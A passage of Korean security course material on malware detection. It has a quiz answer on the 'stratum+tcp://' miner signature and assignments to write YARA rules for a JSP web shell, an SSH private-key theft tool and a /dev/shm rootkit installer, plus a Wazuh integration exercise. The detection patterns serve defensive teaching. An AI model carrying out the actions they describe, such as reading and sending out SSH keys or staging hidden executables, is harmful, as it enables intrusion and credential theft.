**Q10.** 암호화폐 채굴기 탐지에서 "stratum+tcp://" 패턴이 중요한 이유는?

<details><summary>정답</summary>
stratum은 채굴 풀과 채굴기 간의 통신에 사용하는 전용 프로토콜이다. 정상적인 소프트웨어에서는 거의 사용되지 않으므로 오탐 확률이 매우 낮은 고신뢰도 시그니처다.
</details>

---

## 과제

### 과제 1: 종합 YARA 룰셋 작성 (필수)

다음 3가지 위협을 탐지하는 YARA 룰을 각각 작성하라:
1. **JSP 웹셸**: Runtime.getRuntime().exec() 패턴
2. **SSH 키 탈취 도구**: .ssh/id_rsa 접근 + 네트워크 전송
3. **루트킷 설치 스크립트**: /dev/shm 사용 + chmod +x + 프로세스 은닉

각 룰에 테스트 샘플(양성 2개 + 음성 1개)을 함께 제출하라.

### 과제 2: YARA + Wazuh 통합 테스트 (선택)

Wazuh FIM이 웹 디렉토리의 파일 변경을 탐지하면 YARA 스캔이 자동 실행되는 환경을 구축하고:
1. 웹셸 업로드 시뮬레이션 → YARA 탐지 → 격리 확인
2. 정상 파일 업로드 → YARA 통과 확인
3. 전체 파이프라인 동작 스크린샷 제출

---

## 다음 주 예고

**Week 05: 위협 인텔리전스**에서는 STIX/TAXII 표준, MISP, OpenCTI를 활용한 위협 인텔리전스 수집과 IOC 피드 연동을 학습한다.
